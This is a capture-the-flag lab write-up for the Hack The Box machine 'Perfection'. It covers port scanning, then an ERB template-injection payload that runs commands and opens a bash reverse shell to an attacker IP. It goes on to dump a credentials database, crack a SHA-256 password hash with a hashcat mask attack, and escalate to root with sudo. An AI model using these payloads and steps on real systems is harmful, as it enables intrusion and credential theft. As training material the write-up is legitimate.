---
layaout: post
image: /assets/perfection/perfection.png
title: Perfection Write Up HTB
date: 12-02-2025
categories: [Write ups]
tag: [Hash Cracking,SSTI,Credential Dumping,Linux]
excerpt: "Perfection on Hack The Box is an easy-difficulty Linux machine that revolves around exploiting a vulnerable student score calculation web application and escalating privileges through password cracking. The initial foothold requires leveraging a Server-Side Template Injection (SSTI) vulnerability by bypassing a regex filter, granting access to the machine. From there, privilege escalation involves discovering password hashes stored in a database and performing a mask attack to retrieve credentials, ultimately leading to root access.

This machine is ideal for those looking to understand SSTI exploitation and password-cracking techniques in a real-world scenario"
---
![img-description](/assets/perfection/perfection.png)

Perfection on Hack The Box is an easy-difficulty Linux machine that revolves around exploiting a vulnerable student score calculation web application and escalating privileges through password cracking. The initial foothold requires leveraging a Server-Side Template Injection (SSTI) vulnerability by bypassing a regex filter, granting access to the machine. From there, privilege escalation involves discovering password hashes stored in a database and performing a mask attack to retrieve credentials, ultimately leading to root access.

This machine is ideal for those looking to understand SSTI exploitation and password-cracking techniques in a real-world scenario

## ENUMERATION
---
First, we perform an Nmap scan to identify open ports:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.253 -oG allPorts
```

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.253 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 21:28 CET
Initiating SYN Stealth Scan at 21:28
Scanning 10.10.11.253 [65535 ports]
Discovered open port 22/tcp on 10.10.11.253
Discovered open port 80/tcp on 10.10.11.253
Completed SYN Stealth Scan at 21:28, 12.20s elapsed (65535 total ports)
Nmap scan report for 10.10.11.253
Host is up, received user-set (0.046s latency).
Scanned at 2025-02-12 21:28:40 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
           Raw packets sent: 65591 (2.886MB) | Rcvd: 65535 (2.621MB)
```

Since port 80 is open, we add it to the `/etc/hosts` file with the corresponding domain:

```bash
vim /etc/hosts
```

Upon accessing the domain, we see the following page:

![Texto alternativo](/assets/perfection/Screenshot%202025-02-12%20214412.jpg)

There is a "calculate" section, which likely uses a template engine on the backend (such as ERB, Jinja2, Twig, etc.). This could be vulnerable to Server-Side Template Injection (SSTI).

## FOOTHOLD
---
To test for SSTI, we send the following payload using Burp Suite and check the response:
**IMP : You need to put several categories or else it won't work**

```bash
Math%0a<%25%3d+IO.popen('id').readlines()+%25>
```

![Texto alternativo](/assets/perfection/Screenshot%202025-02-12%20224947.jpg)

Since the application is vulnerable, we proceed to execute a reverse shell:

```bash
Math%0a<%25%3d+IO.popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.16/4444+0>%261"').readlines()+%25>
```

Set up a listener and execute the payload:

```bash
nc -lvpn 4444
```

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.253] 56024
bash: cannot set terminal process group (1027): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ 
```

To improve shell functionality, run:

```bash
script /dev/null -c /bin/bash
```

```bash
susan@perfection:~$ script /dev/null -c /bin/bash
script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
```

Now, in Susan's home directory, we find `user.txt`:

```bash
susan@perfection:~$ cat user.txt
03f43e5a1367d8ed6############
```

## PRIVILEGE ESCALATION
---
Inside Susan's home directory, we find a `Migration` folder containing a database.

![Texto alternativo](/assets/perfection/Screenshot%202025-02-12%20230159.jpg)

Since it is a binary file, we use `strings` to extract readable data:

```bash
strings pupilpath_credentials.db
```

```bash
susan@perfection:~/Migration$ strings pupilpath_credentials.db
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
...
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

### MASK ATTACKS
---
We focus on cracking Susan's password hash. First, create a wordlist containing the prefix `susan_nasus_`:

```bash
echo "susan_nasus_" > wl
```

Save the hash into a file:

```bash
echo "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" > hash
```

Identify the hash type:

```bash
hashid -m 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
```

```bash
[+] SHA-256 [Hashcat Mode: 1400]
```

Using Hashcat to crack the hash:

```bash
hashcat -m 1400 -a 6 hash wl ?d?d?d?d?d?d?d?d?d -O
```

| Command                | Description |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **hashcat**            | Runs Hashcat. |
| **-m 1400**            | Specifies the hash type (SHA-256). |
| **-a 6**               | Uses hybrid attack mode, combining a dictionary and a mask. |
| **hash**               | File containing the target hash. |
| **wl**                 | Dictionary file containing the fixed portion of the password (`susan_nasus_`). |
| **?d?d?d?d?d?d?d?d?d** | Mask specifying a 9-digit numeric suffix. |
| **-O**                 | Enables optimized mode, improving performance. |

After some time, we retrieve the password: **susan_nasus_413759210**

```bash
Session..........: hashcat
Status...........: Cracked
...
Recovered........: 1/1 (100.00%) Digests
...
```

Now, we can use `sudo su` to escalate privileges:

```bash
susan@perfection:~$ sudo su
[sudo] password for susan: susan_nasus_413759210

root@perfection:/home/susan# 
```

Retrieve `root.txt`:

```bash
root@perfection:~# cat root.txt
bd91ee880f4328d588############
```

Both flags are now obtained!

